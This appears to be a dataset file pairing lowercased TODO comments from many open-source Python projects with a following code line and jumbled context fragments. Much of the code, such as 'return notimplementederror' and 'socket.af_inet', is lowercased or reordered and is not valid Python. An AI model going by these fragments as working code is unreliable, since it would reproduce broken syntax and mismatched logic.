#if (have_kratos is true): # todo: implement natively </s> if write_binary:	write def write(filename, mesh, write_binary=False): <https://github.com/KratosMultiphysics/Kratos/wiki/Input-data>. raise NameError('Only ASCII mdpa supported') cells = mesh.cells.copy()
# todo track_set_seen() </s> return bool(lib.sp_playlist_track_seen(self._sp_playlist, self._index))	seen def seen(self):
# todo: support multi-index here </s> if len(index_scols) != 1:	filter elif regex is not None: if axis in ('index', 0): raise ValueError("Single index must be specified.") sdf = sdf.filter(index_scols[0].rlike(regex))
# todo: larger gains expected with scipy.signal.signaltools.fftconvolve(). </s> psi = tf_signal.frame(y, k, 1, axis=-1)[..., :t - delay - k + 1, ::-1]	get_correlations D = dyn_shape[1] T = dyn_shape[2] Psi_conj_norm = ( tf.cast(inverse_power[:, None, delay + K - 1:, None], Psi.dtype)
# todo(aditya): temporarily we are filtering out todos </s> next_todo = (	tasks_assigned_to_worker should_be_active = False if state in ('returned', 'in_progress'): task_assignment.task.todos .filter(
# todo: make locking work for mssql </s> pass	create_global_lock conn.execute(text("select RELEASE_LOCK(:id)"), id=str(lock)) elif dialect.name == 'mssql':
# todo: move this into the operations code for its caller </s> for a in self.atoms.values():	Passivate This transmutes real atoms to match their number of real bonds, and (whether or not that succeeds) removes all their open bonds. if p or a.picked: a.Passivate()
# todo(lbragstad): sleeping after the response status has been checked </s> time.sleep(1)	test_user_update_own_password new_pass=old_pass, old_pass=new_pass) resp = self.non_admin_client.update_user_own_password(
# todo: this is a case we should deal with, but there are probably </s> anchor = none	L006_fix ) elif len(memory['since_code']) > 1: pass else:
# todo: fix this </s> logger.log("i", "found cluster %s with network key %s", device, local_network_key)	_connectByNetworkKey return
# todo implement this </s> return notimplementederror	get_app_path if self.app_path is not None: return self.app_path from droidbot import DroidBot out_dir = DroidBot.get_instance().options.output_dir
# todo - this should be moved to the `finalize` method of the base resource, as it's not cross-service </s> if 'ec2' in self.service_list:	preprocessing ip_ranges = [] if ip_ranges is None else ip_ranges self._map_all_subnets() self._map_all_sgs() self._add_security_group_name_to_ec2_grants()
# todo: tf and jax sort [inf, nan] differently. </s> first_arr_jax, first_arr_tf = result_jax[0], result_tf[0].numpy()	test_top_k def custom_assert(result_jax, result_tf): assert len(result_jax) == len(result_tf) if np.all(first_arr_jax == first_arr_tf): for arr_jax, arr_tf in zip(result_jax, result_tf):
## fixme: # todo: remove me </s> origin_paste = paste	get_all_domain_screenshot l_screenshot_paste = [] for paste in l_crawled_pastes: paste= paste.replace(self.paste_directory+'/', '') screenshot = self.get_item_screenshot(paste)
# todo: add and store preprocessing errors. </s> logging.error('unable to decode username.')	_ParseFileData username = row[0].decode('utf-8') except UnicodeDecodeError: continue try:
# todo: change docstring or remove unsqueeze(-1) </s> model = mollifiercutoff()	x_test_shape_mollifier_cutoff def x_test_shape_mollifier_cutoff(distances): inputs = [distances] out_shape = list(distances.shape)
# todo col.type.python_type contains the type that </s> py_type = _type_map[type(col.type)]	__init__ setattr(self, prp.key, val) else: if not isinstance(val, py_type): raise TypeError(
# xxx todo </s> return address, size	input_address_range size    = None
# todo(rosmaita): bug #1745003 </s> self.assertequal('shared_id', rows[3]['id'])	TestOcataMigrate01Mixin self.assertEqual('private_id_2', rows[1]['id']) self.assertEqual('public_id', rows[2]['id'])
# todo: remove in v.0.6 </s> x = np.array([[0, 0], [0, 1], [2, 0], [2, 1]])	test_deprecation_bounds def test_deprecation_bounds(self): y = np.array([1, 0, 1, 0]) itml_supervised = ITML_Supervised(bounds=None)
except exception:  # todo - which exceptions? </s> pass  # skip unparsable tag	_parse_feature try: feature.qualifiers[feature_element.tag.replace(NS, '')] = feature_element.text self.ParsedSeqRecord.features.append(feature)
# todo: consider filtering by location type </s> return match_district(domain, xlsx_facility_name)	match_facility def match_facility(domain, xlsx_facility_name): Given facility name taken from the spreadsheet, return the name and id of the matching location in HQ.
#todo: make more general (if possible) </s> solar_date = self.solar_date(record_dict)	solar_month Function which takes a record_dict containing all values from a query in the get_db_slices function and returns the solar year of the observation return solar_date.month
# todo: let the globe return the semimajor axis always. </s> a = self.globe.semimajor_axis or wgs84_semimajor_axis	NearsidePerspective false_northing=false_northing, globe=globe) h = np.float(satellite_height) max_x = a * np.sqrt(h / (2 * a + h))
pass # todo: explain </s> pass	status402 def status402(self):        # Payment Required
# todo: fix as soon as we have preprocessvector (different parallel dict preprocessor for different spaces in a dict) </s> if len(self.preprocessors) > 1 or "" not in self.preprocessors:	get_preprocessed_state_action_and_action_probs - DataOp: The probabilities of all possible actions. max_likelihood = self.max_likelihood if self.max_likelihood is not None else self.policy.max_likelihood preprocessed_states = self.call(self.vector_preprocess, states) else:
# temporary for testing. todo: remove </s> self.temp_list = list()	__init__ self.count_profit_for_settlements = False self.csvexporter = CSVExporter(profit_currency, logger, create_csv)
# todo:  we might need additional logic comparing the state of git-annex </s> pblshd = ds.repo.copy_to(files=paths,	_publish_dataset lgr.debug("Invoking copy --auto") annex_copy_options += ' --auto' remote=remote, options=annex_copy_options)
# todo: test that valueerror is raised </s> validate.direction(direction)	emd func = effect_emd else: return round(func(d1, d2), config.PRECISION)
# todo: remove </s> c.pkg = context['package']	history c.pkg_revisions = get_action('package_revision_list')(context, data_dict) except NotAuthorized: abort(401, _('Unauthorized to read package %s') % '')
# todo(yanase): remove number from system_attrs after adding trialmodel.number. </s> assert trials[0].system_attrs == {'number': 0}	test_create_new_trial_id assert trials[0].state == TrialState.RUNNING assert trials[0].user_attrs == {}
#ng_maxlength="30",     # todo: validation </s> ),	NewMobileWorkerForm 'last_name', data_bind='value: last_name', location_field, crispy.Field(
#todo: add way to check if alt is pressed </s> self.currenttool.roll(blocksonly=true)	key_down self.currentTool.flip(blocksOnly=True) elif keyname == config.config.get('Keys', 'Roll'): elif keyname == config.config.get('Keys', 'Rotate'): self.currentTool.rotate(blocksOnly=True)
# todo signals instead of direct dialog creation? </s> changemodeldialog(collection, collection.models.nids(old_model), old_model).exec_()	update_cards self.make_current(collection) old_model["name"] += " *old"
#todo: handle ipv6 </s> with socket.socket(socket.af_inet, socket.sock_dgram) as sock:	create_nio rport = request["nio"]["rport"] try: sock.connect((rhost, rport)) except OSError as e:
# todo(jaypipes): port nova's fault infrastructure </s> self.assertraises(exception.notfound, req.get_response, controllers.api())	test_delete_image_not_existing req = webob.Request.blank('/images/3') req.method = 'DELETE'
# todo: detect if any database upgrading is needed and acquire the lock only in one place </s> with manager.acquire_lock(event=false):	after_table_create from flexget.manager import manager if tables: tables = [table.name for table in tables] for plugin, info in plugin_schemas.iteritems():
pass  # todo </s> def test_cells(self):	test_cells
# todo: fill the blank space at the bottom of the page </s> result = find_earlier_page_break(	block_container_layout last_in_flow_child, child) if new_children and page_break in ('avoid', 'avoid-page'): new_children, absolute_boxes, fixed_boxes) if result:
# todo: send `goodbye` req then disconnect </s> return	Node str(error) ) hello_mine = self._make_hello_packet() self.logger.debug("Sending our hello message %s", hello_mine)
# todo add support </s> links = {}	importSDF sdfannos = {} sdfannos.update({a: gUtils.parse_text(sdfroot.find(a).text) for a in genparams}) materials = {} log("Parsing links...", 'INFO')
# todo consolidate </s> key_dispatch[key]	loadini for key in (struct.pastebin_key, struct.save_key):
@unittest.skip('not written')  # todo: finish! </s> def test_file(self):	test_file raise NotImplementedError
# todo: let the globe return the semimajor axis always. </s> a = np.float(self.globe.semimajor_axis or 6378137.0)	Orthographic ('lat_0', central_latitude)] super(Orthographic, self).__init__(proj4_params, globe=globe) b = np.float(self.globe.semiminor_axis or a) if b != a:
#todo: decide if this method really adds anything of value ... </s> return self.input(input_name).path	get_path def get_path(self, input_name):
# todo: figure out why this fails </s> np.testing.assert_equal(rl.dense_to_brle(x),	test_dense_to_brle if True: return [300, 200, 1000, 0]) np.testing.assert_equal(
# todo(guillermooo): add regexes </s> cmd = [sdk.path_to_dart, '--checked', file_name]	DartRunCommand _logger("unknown action: %s", action) return self.execute(cmd, working_dir) def execute(self, cmd, working_dir):
# todo: look this up in one query </s> for user_id in p.collaborator_ids:	get_playlists_created_for_user p.collaborator_ids = playlist_collaborator_ids.get(p.id, []) collaborators = [] user = db_user.get(user_id) if user:
# todo raise exception if source_group is none? </s> if source_group:	authorize_security_group_ingress for source_group_id in source_group_ids: source_group = self.get_security_group_from_id(source_group_id) source_groups.append(source_group) security_rule = SecurityRule(
# todo: add and store preprocessing errors. </s> logging.error('unable to decode username.')	_ParseFileData username = row[0].decode('utf-8') except UnicodeDecodeError: continue try:
# todo: inform cluster </s> self.pending_clusters.clear()	_shutdown except: logger.debug(traceback.format_exc()) self.unsched_clusters = [] while (any(cluster.pending_jobs for cluster in self._clusters.itervalues())):
# todo: non standard, uses convs </s> raise notimplementederror()	replace_head n_classes, keep_weights) elif isinstance(model, torchvision.models.SqueezeNet): elif isinstance(model, torchvision.models.Inception3): raise NotImplementedError()
# todo: support minp arg end_range etc. </s> minp = 1	roll_variable_apply on_arr = cast_dt64_arr_to_int(on_arr_dt) N = len(in_arr) left_closed = False right_closed = True
# todo: switch to: </s> self.change_track(tl_track)	next tl_track = self.core.tracklist.next_track(self.current_tl_track) if tl_track: else: self.stop(clear_current_track=True)
# self.assertisnotnone(result_set.service_processing_time_in_millis)  # todo flaky test </s> self.assertisnotnone(result_set.output_location)	test_fetchone self.assertIsNotNone(result_set.total_execution_time_in_millis) self.assertIsNotNone(result_set.query_planning_time_in_millis) self.assertIsNone(result_set.data_manifest_location)
# todo: cleanup directory/basename.* files. </s> tmp = tempfile.namedtemporaryfile(	commit def commit(self): directory, basename = os.path.split(self._tag_cache_file) prefix=basename + '.', dir=directory, delete=False) try:
# todo: restore... needed for complete compatibility with tomxobjects... </s> and (chordparent.notehead != 'normal'	dealWithNotehead if foundANotehead is False and chordParent is not None: if (hasattr(chordParent, 'notehead') or chordParent.noteheadParenthesis or chordParent.noteheadFill is not None
# todo: check if "class" in current line, add class name </s> txt = txt.replace("private ", "")	java2pythonlinebyline txt = txt.replace("public ", "") if txt[count:].startswith("private ") >= 0: if txt[count:].startswith("static ") >= 0: txt = txt.replace("static ", "")
# todo: remove this skip after fixing </s> if sys.version[0] == 3:	test_circle_draw @requires_application() def test_circle_draw(): raise SkipTest with TestingCanvas() as c:
# todo(b/183565702): support integer convolutions on cpu/gpu. </s> if jtu.device_under_test() == "gpu":	testConvGeneralDilatedPatchesNonOverlapping if jtu.device_under_test() == "cpu" and jax.lib.version < (0, 1, 65): raise SkipTest("Integer convolution requires jaxlib 0.1.65 or newer on CPU") raise SkipTest("Integer convolution not yet supported on GPU") rng = jtu.rand_small(self.rng())
# todo: remove this and figure out why queue thread does not properly exit </s> self.sess.close()	optimize self.term_event.set() self._close_tensorboard() logging.info('Waiting for Queue Thread to Exit') while not self.queue_thread_exited:
# todo: this will incorporated in the future, if needed. </s> edge_starts = []	specify_internal_edge_starts edge_starts = [] else: return edge_starts
# todo check if varnos are exactly the crosscat variables. </s> return varnos, seen_optimized	_retrieve_analyze_variables if seen_variables: raise BQLError(bdb, 'OPTIMIZED incompatible with VARIABLES')
# todo: check </s> self.projection_matrices = nn.embedding(num_relations, self.entity_embedding_dim * self.relation_embedding_dim)	__init__ self.entities_embeddings = nn.Embedding(num_entities, self.entity_embedding_dim) self.relation_embeddings = nn.Embedding(num_relations, self.entity_embedding_dim) self.margin_loss = margin_loss
# todo: this stuff should be generated by a template of some sort </s> projecturl = s.getprojecturl()	footer def footer(self, s, req): projectName = s.getProjectName() data = '<hr /><div class="footer">\n'
# todo: make it pass </s> self.assertequals('a_var.an_attr', word_finder.get_name_at(10))	xxx_test_attribute_accesses word_finder = WordRangeFinder('a_var.an_attr')
# todo: add for morph targets data. </s> min_index = min(indices)	extract_primitive_floor process_bone = False bone_max = bone_index max_index = max(indices) for old_index in indices:
# todo(twd2): do more visibility check eg. contest </s> ddocs, dpcount, _ = await pagination.paginate(	DiscussionNodeHandler if vnode['doc_type'] == document.TYPE_PROBLEM and vnode.get('hidden', False): self.check_perm(builtin.PERM_VIEW_PROBLEM_HIDDEN) discussion.get_multi(self.domain_id, parent_doc_type=vnode['doc_type'],
# end todo </s> x = unfold_func(module)(module.input0)	weight_diag_ggn sqrt_ggn = sqrt_ggn.view(num_classes * batch, out_features) sqrt_ggn = sqrt_ggn.view(num_classes * batch, out_channels, out_x * out_y) X = X.repeat(num_classes, 1, 1) sqrt_ggn = einsum('bml,bkl->bmk', (sqrt_ggn, X)).contiguous()
# todo: figure out way to paramaterize this test </s> for x in range(0, node["num_devices"] * 2):	test_osds_listen_on_cluster_network def test_osds_listen_on_cluster_network(self, node, Socket): port = "680{}".format(x) assert Socket("tcp://{address}:{port}".format(
# todo message </s> return symbol('$failed')	Import function_channels = importer_options.get("System`FunctionChannels") if function_channels is None: default_element = importer_options.get("System`DefaultElement") if default_element is None:
#todo: increase timeout based on number of plugins </s> response = opener.open(url, none, 5)	_plugin_fetch ) )] data = response.read() if not data:
# time.sleep(40)  # todo: should remove after polling get. </s> mpc_1_2_3 = op(mpc_1_2, tensor_pointer_3)	test_tensor_abstraction_pointer mpc_1_2 = op(tensor_pointer_1, tensor_pointer_2) mpc_1_2.block_with_timeout(secs=40) mpc_1_2_3.block_with_timeout(secs=40) exp_res = op(data_1, data_2)
# todo(rbharath): how does distance need to be modified here to </s> dists = tf.reduce_sum((tiled_coords - nbr_coords)**2, axis=3)	compute_neighbor_list atoms_in_nbr_cells = tf.gather(atoms_in_cells, neighbor_cells) nbr_coords = tf.gather(coords, atoms_in_nbr_cells) dists = tf.reshape(dists, [N, -1]) closest_nbr_locs = tf.nn.top_k(dists, k=M)[1]
# todo refactor to .session </s> def get_session_view_value(view, name: str):	get_session_view_value try: return _views[view.id()][name]
# todo refactor set position cursor after operation into reusable api. </s> new_sels = []	_vi_big_d self.view.run_command('left_delete') if mode == VISUAL: update = False for sel in self.view.sel():
# todo: insert more test values here </s> self.assertalmostequal(gamma_to_impedance(0.2), 75)	test_gamma_to_impedance self.assertEqual(gamma_to_impedance(0), 50)
self.setup()  # todo: perhaps, remove this to pass path in context </s> current_ids = self.hash(	transform :param data_inputs: the data input to transform :return: transformed data inputs current_ids=None, hyperparameters=self.hyperparams,
# todo[lauren]: add proper authorizers to draftregistrationapproval </s> user = osf_user.load('dsmpw')	approve_draft :return: DraftRegistrationApproval obj draft = get_draft_obj(draft_pk) draftRegistrationApproval = draft[0].approval draftRegistrationApproval.add_authorizer(user)
# todo: use validation set if not-none </s> model = self.new_model()	best_model_vector_classification def best_model_vector_classification(self, train, valid): model.fit(train.x, train.y) model.trained_on = train.name
# todo(twd2): check permission for visibility. (e.g. test). </s> rdoc = await record.get(rid)	RecordDetailView @base.sanitize async def get(self, *, rid: objectid.ObjectId): if not rdoc: raise error.RecordNotFoundError(rid)
csv_reader = caches[caches_celery_query_result_key].get(_result_key(notebook)) # todo check if expired </s> headers = csv_reader[0] # todo check size	fetch_result with storage.open(_result_key(notebook)) as f: if TASK_SERVER.RESULT_CACHE.get(): csv_reader = csv_reader[1:] else:
# todo dry </s> try:	_expect except pexpect.TIMEOUT: pass pnum = self.con.expect('Indication   handle = .*? \r', timeout=.5) if pnum == 0:
# todo(python3): modify pool to context manager (with statement) </s> results = self.pool.map(partial(execute_query, conn_args=self.conn_args, verbose=self.verbose), [(idx, q) for idx, q in enumerate(queries)])	execute_queries print('Preparing to execute %d queries.'%len(queries)) tic = time.clock() toc = time.clock() if self.verbose:
# todo: run this with mock file </s> from zim.fs import dir	testMultiFile def testMultiFile(self): folder = self.setUpFolder('multi', mock=tests.MOCK_ALWAYS_REAL) exporter = build_notebook_exporter(Dir(folder.path), 'html', 'Default.html')
1  # todo: fill in identifier </s> )	test__if_updater_made_mistake AB_Transfer0 = channelAB.create_directtransfer( transfer_amount, AB_Transfer0.sign(privatekeyA, addressA) channelAB.register_transfer(AB_Transfer0)
# todo: test for external ring source values is missing as it needs </s> assert_array_equal(_chart.data['colors'], colors)	TestDonut assert_array_equal(_chart.data['end'], end)
# todo ?? </s> sleeps = lfilter(predicate, sleeps)	plot def plot(): sleeps_count = len(sleeps) print(sleeps_count)
# todo defensive? </s> raise runtimeerror(dates)	as_annotation pass else: return Annotation( path      = path,
# todo: deal with error </s> with open(os.path.join(ttfolder, "mastermodel.pickle"), "rb") as f:	DSFont outputWriter(output) vfFontData, error = await compileDSToBytes(self._fontPath, ttFolder, outputWriter) self.masterModel = pickle.load(f) assert len(self.masterModel.deltaWeights) == len(self.doc.sources)
# todo: handle % widths </s> raise typeerror('width %s is unknown' % box.style['width'])	block_preferred_minimum_width return box.style['width'] else:
# todo: finish this. </s> def mkdir(self, path, mode):	mkdir pass
# todo(b/178123173) enable tests after b/193022465 is resolved. </s> "auto_one_device_strategy": self.auto_one_device_strategy(),	test_run_on_script track_status = { "auto_mirrored_strategy": self.auto_mirrored_strategy(), "none_dist_strat": self.none_dist_strat(), "docker_config_cloud_build": self.docker_config_cloud_build(),
# todo: sync the doc. </s> return self._reduce_for_stat_function(f.min, only_numeric=false)	min databricks.koalas.DataFrame.groupby
#  todo: test </s> ship.getmodifieditemattr("shipbonusics2"),	handler "maxGroupOnline",
# todo: move space inference here. </s> component.constant_op_records.add(op_rec)	DataOpRecordColumn constant_op = np.array(args[i]) op_rec.op = constant_op self.op_records.append(op_rec) if kwargs is not None:
# todo: out to file </s> pass	write_up def write_up(self):
# todo: deprecate this?  properties are generally preferred over "set*()" </s> def setub(self, val):	_VarData the value is fixed (or None). self.lower = val Set the upper bound for this variable after validating that the value is fixed (or None).
# todo: the following skipped suite and fixtures should be enabled </s> return	test_Provider_when_calling_delete_record_by_identifier_should_remove_record def test_Provider_when_calling_delete_record_by_identifier_should_remove_record(self):
# todo(elliot): include the rest of the necessary keys </s> )	handle_download_recipe_input "Processor": "AppDmgVersioner", "Arguments": {"dmg_path": "%pathname%"}} elif parsed_download_format == "zip": recipes[i]["Process"].append({
# @todo: widget? </s> ),	DataCollectionTemplateModel Field("model", "json", requires = IS_EMPTY_OR(IS_JSON()), s3_comments(), *s3_meta_fields())
# todo: renable when t34648262 is fixed </s> outputs.append(new_output)	Preprocessor ) new_output *= not_missing_input[:, j : j + 1] else: norm_params = []
# todo: this should support multi-db </s> fields = tuple(self._table_columns_iterator(table_name))	assertColumnExists def assertColumnExists(self, table_name, field_name): self.assertTrue(field_name in fields, "Field '%(table)s.%(field)s' doesn't exist, '%(table)s'"
# todo(dcramer): this should respect rate limits/etc and use the normal </s> try:	send def send(self, project, **kwargs): manager = EventManager(kwargs) data = manager.normalize()
# todo ideally this happens a layer higher, but this is a bad </s> return sanitize_html(open( data.file_name ).read()).encode('utf-8')	display_data if not data.creating_job.imported and data.creating_job.tool_id in trans.app.config.sanitize_whitelist: return open(data.file_name).read() return open( data.file_name ) else:
# todo align api and test after - now tip_id is ignored </s> request = self.validate_message(self.request.body, requests.receiverreceiverdesc)	get Response: receiverTipList Errors: InvalidTipAuthToken
#todo: dont unfold all, but allow enum_all() to work </s> tree_proc(self.tree, tree_item_unfold_deep, 0)	menu_goto msg_status('Project not opened') return files = [] def callback_collect(fn, item):
# todo: try/catch </s> m = importlib.import_module(module_name)	class_for_name def class_for_name(self, module_name, class_name): c = getattr(m, class_name) return c
# todo: change this to be architecture independent </s> raise runtimeerror("could not retrieve processor type: %s" %ex)	get_proc_type except Exception as ex:
# todo: commented out so we don't prompt for installing vc or vcp until they </s> prompt = 'would you like to install a platform historian?'	wizard do_web_enabled_zmq(volttron_home) _update_config_file() response = prompt_response(prompt, valid_answers=y_or_n, default='N') if response in y:
# todo: refactor common tests for all models, e.g. shape checking </s> scores = model.forward_owa(triples)	test_simple batch_size = 16 triples = torch.zeros(batch_size, 3, dtype=torch.long) assert scores.shape == (batch_size, 1) scores = model.forward_cwa(triples[:, :2])
pass # todo </s> def handle_request(self, input):	handle_request
raise skiptest() # todo fixme </s> dexy.commands.run()	test_filters_text_single_alias_source_nocolor @patch('sys.stdout', new_callable=StringIO) def test_filters_text_single_alias_source_nocolor(stdout): text = stdout.getvalue() assert "pyg, pygments" in text
# todo: warn on failure to delete? </s> raise	_delete_arc_equiv except DependingAnnotationDeleteError, e:
# todo -- validate other options </s> die("[%s] has no 'username'" % target)	_validate_bitbucket if not config.has_option(target, 'username'):
# todo: use utils.normalize when rebased onto develop </s> macro_tpm = np.array([list(row) if sum(row) == 0 else list(row / sum(row))	make_macro_tpm mapping[current_state_index]] += \ micro_tpm[past_state_index, current_state_index] for row in macro_tpm]) return macro_tpm
# todo: seems to be doing < rather than <= ??? </s> xpath.add_post_condition("@x0 >= %s" % x0)	_xpath_in_bbox def _xpath_in_bbox(self, xpath, expr): x0,y0,x1,y1 = map(float, expr.split(",")) xpath.add_post_condition("@y0 >= %s" % y0) xpath.add_post_condition("@x1 <= %s" % x1)
# use the mean of the previous noise values (todo: be smarter here). </s> noise_shape = y_fantasized.shape[1:]	fantasize ) Y_fantasized = sampler(post_X)  # num_fantasies x batch_shape x n' x m noise = self.likelihood.noise.mean().expand(noise_shape) return self.condition_on_observations(
# todo: clean up </s> for _ in range(num_hosts)	gossipsubs )
# todo check behavior when not loaded </s> return utils.to_unicode(	review @property def review(self): lib.sp_albumbrowse_review(self._sp_albumbrowse))
#@todo: remove in 0.4.10 </s> def error(self, reason=none, type="parse"):	error raise Fail("%s error%s | Plugin out of date" % (type.capitalize(), ':' + str(reason) if reason else "")) if self.core.debug:
# todo: ignore models which were killed early by scheduler (eg. in hyperband). how to id these? </s> file_id = "trial_"+str(trial) # unique identifier to files from this trial	hyperparameter_tune hpo_model_performances = {} for trial in sorted(hpo_results['trial_info'].keys()): file_prefix = file_id + "_" trial_model_name = self.name+"_"+file_id
# todo remove! </s> return self.name	get_name def get_name(self):
raise skiptest  # todo: figure out why this randomly started failing. </s> qs = {'a': 1, 'w': 4, 'format': 'json', 'thread_type': 2,	test_discussion_filter_locked def test_discussion_filter_locked(self): 'forum': 1, 'q': 'locked'} response = self.client.get(reverse('search'), qs)
# todo: distributed search messages need to implemented </s> self.logmessage("%s %s" %(msg.__class__, vars(msg)), 4)	DistribChildDepth def DistribChildDepth(self, msg):
# todo: optimize queries </s> member_count = team.member_set.count()	SelectTeamForm choices = [] for team in self.team_list.itervalues(): project_count = team.project_set.count() if member_count > 1 and project_count:
# todo: remove in galaxy 20.xx, for running jobs at gx upgrade </s> if not os.path.exists(version_filename):	JobWrapper if self.tool.version_string_cmd: version_filename = self.get_version_string_path() version_filename = self.get_version_string_path_legacy() if os.path.exists(version_filename):
# todo: speedup by allocating the denominator directly instead of constructing it by sum </s> return tf.slice(tens, [0, 0, second * single_batch_size], [m, n, single_batch_size])	half n = int(n)
reorder_attributes(root_element)  # todo: remove when support is python 3.8+ </s> tree = et.elementtree(root_element)	export_to_xml if p.is_dir(): p /= 'settings.xml' tree.write(str(p), xml_declaration=True, encoding='utf-8')
# todo: maps of packages </s> install_type = self.cfg['container']['install_type']	install expect = expect or self.get_default_expect() if options is None: options = {} if install_type == 'apt': cmd = 'apt-get install'
# todo: uncomment this test case when #1217 is fixed. </s> ('http:/yo/pytest2-1.0.tar.gz',	test_evaluate_link__substring_fails @pytest.mark.parametrize('url, expected_msg', [ 'Missing project version for pytest'), ('http:/yo/pytest_xdist-1.0-py2.py3-none-any.whl',
# todo - fix meta.submission to point to real submission </s> self.submission.submission.unhandled()	_remove_handled def _remove_handled(self, submission): Only used when we are deleting data from xformmanager but not receiver
# todo: test </s> return self.get_final_response(base_response, output)	trigger_dag base_response["run_id"] = run_id
# todo(b/160795287): deprecate estimator based executor. </s> serving_source = path_utils.serving_model_path(fn_args.model_run_dir)	Do absl.logging.info('Exported eval_savedmodel to %s.', fn_args.eval_model_dir) io_utils.copy_dir(serving_source, serving_dest) absl.logging.info('Serving model copied to: %s.', serving_dest)
# todo(bnemec): this should be documented as an ivar, but can't be due </s> self.requires = exec_requires.union(addl_requires)	__init__ (self.revert_rebind, addl_requires, self.revert_optional) = revert_mapping
# todo: https://github.com/fonttools/fonttools/issues/842 </s> self.assertequals(name.langid, 18)	test_nameid_mac_croatian self.assertEquals(name.platEncID, 0)
# todo(b/160795287): deprecate estimator based executor. </s> absl.logging.warning('support for estimator-based executor and model'	eval_model_path if tf.io.gfile.exists(model_dir): try: ' export will be deprecated soon. Please use' ' export structure '
# todo: update this when we have replaced elements that do not </s> assert intrinsic_width is not none	replaced_box_width Compute and set the used width for replaced boxes (inline- or block-level) _surface, intrinsic_width, _intrinsic_height = box.replacement if box.width == 'auto': box.width = intrinsic_width
# todo todo todo </s> self.set_progression(src, ((float)(doc_idx+1) /	__on_doc_thumbnailing_doc_done_cb line_iter = self.lists['matches']['model'].get_iter(doc_idx) self.lists['matches']['model'].set_value(line_iter, 2, thumbnail) len(self.lists['matches']['doclist'])), _("Thumbnailing ..."))
# todo permissions scoping </s> def archive_product(request, domain, prod_id, archive=true):	archive_product Archive product product = Product.get(prod_id)
# todo subject.cn from cert? </s> if cleanup:	test_simple_appzip assert proc.returncode == 0, "Return code not 0" assert exists(app_path) os.remove(app_path)
# todo check executions for dict contents </s> pass	process is_exe |= is_execution(assignee) if is_exe: else: details = par.assignment_details
if self.is_direct_mode() or batch or not allow_quick:  # todo: thin mode </s> info = self.info(files, normalize_paths=false, batch=batch)	is_under_annex list of bool For each input file states either file is under annex return [bool(info[f]) for f in files] else:  # ad-hoc check which should be faster than call into annex
# todo: why does pipeline not look like a regular result? </s> assert repr(record)	test_can_run_simple_statement_with_params for record in pipeline.pull(): assert record[0] == {"abc": ["d", "e", "f"]} assert len(record) == 1 count += 1
# todo: what's the right status code here?  202?  different if we already knew about the node(s)? </s> return all_known_nodes()	node_metadata_exchange for node in sprouts: this_node.remember_node(node)
# todo: wells if display config has more than one column </s> "put_loners_in_wells": false	render_form "cases": cases, "form_table_options": { }, "form_meta_data": form_meta_data,
# todo: eliminate asap, for backwards compatibility only </s> return self.get(self)	find def find(self):
# todo: we might want to handle still_alive, e.g. to allow for </s> stdout = self.output_proc(process.stdout) if not process.stdout.closed else none	BatchedAnnex lgr.log(5, "Done sending.") still_alive, stderr = self._check_process(restart=False) if stderr: lgr.warning("Received output in stderr: %r", stderr)
# todo: share code with the loader attribute here. </s> locator = locator(extension=self.loader.extension)	get_relative_template_location return os.path.split(view.template_rel_path) template_dir = view.template_rel_directory template_name = (view.template_name if view.template_name is not None else locator.make_template_name(view))
# todo: cache the list of components that were deactivated </s> for (name, data) in submodel.component_map(active=true).items():	_apply_to instance._transformation_data['bilevel.linear_mpec'].submodel_cuid = ComponentUID(submodel) instance._transformation_data['bilevel.linear_mpec'].block_cuid = ComponentUID(getattr(instance,self._submodel+'_kkt')) if not isinstance(data,Var) and not isinstance(data,Set): data.deactivate()
# todo: how to compare images? </s> r = self._execute_plot_op(plot_op, print_image=true)	test_plot_with_arguments plot_op = tfplot.plot(figure_attention, [attention_tensor])
raise  # todo </s> for ursula in ursulas:	make_arrangements ursulas = [Ursula(is_me=False, ether_address=miner.ether_address, federated_only=federated_only) for miner in sampled_miners] except MinerAgent.NotEnoughMiners: arrangement = Arrangement(alice=self.alice, ursula=ursula, hrac=self.hrac(),
# todo(pkilambi): process the output as needed </s> return out	service_get try: out = utils.execute('kubectl', 'get', 'service', uuid) except Exception as e: LOG.error("Couldn't get service  %s due to error %s" % (uuid, e))
# llamo al método remoto: </s> retval = client.obtenertoken(rfc="aaa010101aaa", transaccionid=1234)	test_obtener_token WSDL = "http://pruebas.ecodex.com.mx:2044/ServicioSeguridad.svc?wsdl" client = SoapClient(wsdl=WSDL, ns="ns0", soap_ns="soapenv") self.assertIsInstance(retval['Token'], basestring) self.assertIsInstance(retval['TransaccionID'], long)
# todo ... </s> :rtype: tf.tensor | none	get_error_value :return: usually the frame error rate, or None if not defined
#todo: check if/where this is used; if not used externally - remove </s> return self.marker_detector.marker_min_confidence	Surface_Tracker @property def marker_min_confidence(self) -> float: @marker_min_confidence.setter def marker_min_confidence(self, value: float):
pytest.config.argon_skip_now("argon transformer error")  # todo triage </s> input_placeholder, input_value = make_placeholder(input_size, sequence_length, batch_size)	test_birnn_deriv_numerical return_sequence, weight_initializer, bias_initializer, sum_out, concat_out): W_in, W_rec, b, init_state, init_state_value = make_weights(input_placeholder, hidden_size, weight_initializer,
# todo: use mode, state </s> if not (self._fillpaths or self._strokepaths):	paint def paint(self, painter, rect, mode, state): return painter.save()
pass # todo </s> if '%d' in args:	parse_exec args[args.index('%s')] = page.source.path if '%n' in args: pass # TODO if '%t' in args:
# todo: targets are always updated if destination directory is new, right? </s> updated_targets = self.updater.updated_targets(targets, destination_directory)	Updater def get_target_filepath(self, source_url): targets = [self.updater.target(target_filepath)] for updated_target in updated_targets: self.updater.download_target(updated_target, destination_directory)
# todo: remove compatability hook </s> if exists(pathjoin(vdir,"esky-bootstrap.txt")):	is_version_dir if exists(pathjoin(vdir,ESKY_CONTROL_DIR,"bootstrap-manifest.txt")): return True return True return False
if self._ndim == 3: # todo: use hasz </s> array = c_double * 3	ctypes def ctypes(self): if not self._ctypes_data: self._ctypes_data = array(self.x, self.y, self.z) else:
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	refresh_provider_fw_rules def refresh_provider_fw_rules(self, security_group_id):
#todo fixme: we need to check that we aren't adding a duplicate </s> item.addclaim(claim)	addClaims pywikibot.output('Adding %s --> %s' % (claim.getID(), claim.getTarget().getID()))
# todo(b/147499373): if none-arguments were uniformly represented as empty </s> @computations.federated_computation(before_agg.type_signature.parameter)	compile_to_mergeable_comp_form after_agg) if before_agg.type_signature.parameter is not None: def up_to_merge_computation(arg): federated_aggregate_args = before_agg_callable(
